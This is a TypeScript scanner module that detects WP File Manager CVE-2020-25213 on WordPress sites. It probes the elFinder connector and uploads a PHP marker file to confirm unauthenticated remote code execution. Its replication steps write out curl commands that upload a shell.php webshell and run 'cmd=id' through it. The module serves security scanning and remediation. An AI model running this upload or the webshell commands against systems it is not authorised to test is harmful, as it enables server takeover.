import type { ModuleResult, ScanState } from '../types.js';
import { fetchURL, finding, moduleResult, normalizeTarget, containsAny } from '../utils.js';

const MODULE_NAME = 'WP File Manager CVE-2020-25213';

const ELFINDER_INDICATORS = ['"api"', '"cwd"', '"files"', '"netDrivers"', 'elFinder', 'elfinder'];

const README_PATH    = '/wp-content/plugins/wp-file-manager/readme.txt';
const AJAX_CONNECTOR = '/wp-admin/admin-ajax.php?action=connector';
const DIRECT_CONNECTOR = '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php';

const TEST_FILENAME = 'strix_test_marker.php';
const TEST_CONTENT  = "<?php echo 'JWP_RCE_TEST'; ?>";

function isVulnerableVersion(text: string): [boolean, string] {
  for (const line of text.split('\n')) {
    const m = line.match(/(?:Stable tag|Version)\s*:\s*([\d.]+)/i);
    if (m) {
      const verStr = m[1];
      const parts = verStr.split('.').map(Number);
      if (parts.some(isNaN)) return [false, verStr];
      const isVuln = parts[0] < 6 || (parts[0] === 6 && (parts.length < 2 || parts[1] <= 8));
      return [isVuln, verStr];
    }
  }
  return [false, ''];
}

export async function run(target: string, _state?: ScanState): Promise<ModuleResult> {
  const start = Date.now();
  target = normalizeTarget(target);
  const findings: ReturnType<typeof finding>[] = [];
  const errors: string[] = [];

  const ajaxUrl   = `${target}${AJAX_CONNECTOR}`;
  const directUrl = `${target}${DIRECT_CONNECTOR}`;

  // Step 1: Check plugin presence and version
  const readmeUrl = `${target}${README_PATH}`;
  let pluginPresent = false;
  try {
    const res = await fetchURL(readmeUrl);
    if (res && res.status === 200) {
      pluginPresent = true;
      const text = await res.text();
      const [isVuln, versionStr] = isVulnerableVersion(text);
      findings.push(finding('wp_file_manager_detected', 'INFO', readmeUrl,
        `WP File Manager plugin detected. ` +
        `Version: '${versionStr || 'unknown'}'. ` +
        `Vulnerable (<=6.8): ${isVuln}.`,
        {
          replication_steps: [`curl -s "${readmeUrl}" | grep -E "Stable tag|Version"`],
          remediation: 'Update WP File Manager to version 6.9 or higher.',
          evidence: JSON.stringify({ version: versionStr, cvss_score: isVuln ? 10.0 : 0.0, cve_refs: ['CVE-2020-25213'] }),
        },
      ));
    }
  } catch (e) {
    errors.push(String(e));
  }

  // Step 2: Probe admin-ajax elFinder connector
  try {
    const res = await fetchURL(ajaxUrl);
    if (res && res.status === 200) {
      const body = await res.text();
      if (containsAny(body, ELFINDER_INDICATORS)) {
        pluginPresent = true;
        findings.push(finding('wp_file_manager_rce', 'CRITICAL', ajaxUrl,
          'elFinder connector responds without authentication via admin-ajax.php. ' +
          'This is the primary indicator of CVE-2020-25213 exploitability.',
          {
            replication_steps: [
              `curl -s "${ajaxUrl}"`,
              '# Observe elFinder JSON response — no auth required.',
              '# Upload PHP shell:',
              `curl -s -F "cmd=upload" -F "target=l1_" \\`,
              `  -F "upload[]=@shell.php;type=application/x-php" \\`,
              `  "${ajaxUrl}"`,
              '# Retrieve uploaded shell:',
              `curl -s "${target}/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"`,
            ],
            remediation:
              'Update WP File Manager to 6.9+ immediately. ' +
              'Restrict access to wp-admin/admin-ajax.php from untrusted IPs. ' +
              'Monitor /wp-content/plugins/wp-file-manager/lib/files/ for suspicious files.',
            evidence: JSON.stringify({ detail: 'HTTP 200 with elFinder JSON from unauthenticated request.', cvss_score: 10.0, cve_refs: ['CVE-2020-25213'] }),
          },
        ));
      }
    }
  } catch (e) {
    errors.push(String(e));
  }

  // Step 3: Probe connector.minimal.php directly
  try {
    const res = await fetchURL(`${directUrl}?cmd=open&target=l1_&init=1`);
    if (res && res.status === 200) {
      const body = await res.text();
      if (containsAny(body, ELFINDER_INDICATORS)) {
        findings.push(finding('wp_file_manager_rce', 'CRITICAL', directUrl,
          'connector.minimal.php is directly accessible and responds to elFinder ' +
          'commands without authentication. RCE via file upload is possible.',
          {
            replication_steps: [
              `curl -s "${directUrl}?cmd=open&target=l1_&init=1"`,
              '# Observe elFinder JSON with file listing.',
              '# Upload PHP webshell:',
              `curl -s -X POST "${directUrl}" \\`,
              '  -F "cmd=upload" -F "target=l1_" \\',
              '  -F "upload[]=@shell.php;type=application/octet-stream"',
            ],
            remediation:
              'Update immediately. Add deny-all rule to connector.minimal.php ' +
              'in .htaccess or Nginx config.',
            evidence: JSON.stringify({ detail: 'connector.minimal.php returns elFinder JSON unauthenticated.', cvss_score: 10.0, cve_refs: ['CVE-2020-25213'] }),
          },
        ));
      }
    }
  } catch (e) {
    errors.push(String(e));
  }

  // Step 4: Attempt upload via connector (PoC)
  for (const connectorUrl of [ajaxUrl, directUrl]) {
    try {
      const form = new FormData();
      form.append('cmd', 'upload');
      form.append('target', 'l1_');
      form.append('upload[]', new Blob([TEST_CONTENT], { type: 'application/octet-stream' }), TEST_FILENAME);

      const res = await fetchURL(connectorUrl, { method: 'POST', body: form });
      if (res && res.status === 200) {
        const body = await res.text();
        if (body.includes('hash') || body.includes(TEST_FILENAME)) {
          findings.push(finding('wp_file_manager_rce', 'CRITICAL', connectorUrl,
            `File upload via elFinder connector succeeded ('${TEST_FILENAME}'). ` +
            'Unauthenticated RCE is confirmed.',
            {
              replication_steps: [
                `curl -s -X POST "${connectorUrl}" \\`,
                '  -F "cmd=upload" -F "target=l1_" \\',
                '  -F "upload[]=@shell.php;type=application/octet-stream"',
                `curl -s "${target}/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"`,
              ],
              remediation:
                'Update WP File Manager to 6.9+ and rotate all credentials. ' +
                'Audit uploaded files immediately.',
              evidence: JSON.stringify({ response_preview: body.slice(0, 200), cvss_score: 10.0, cve_refs: ['CVE-2020-25213'] }),
            },
          ));
          break;
        }
      }
    } catch (e) {
      errors.push(String(e));
    }
  }

  void pluginPresent;
  return moduleResult(MODULE_NAME, target, findings, errors, start);
}
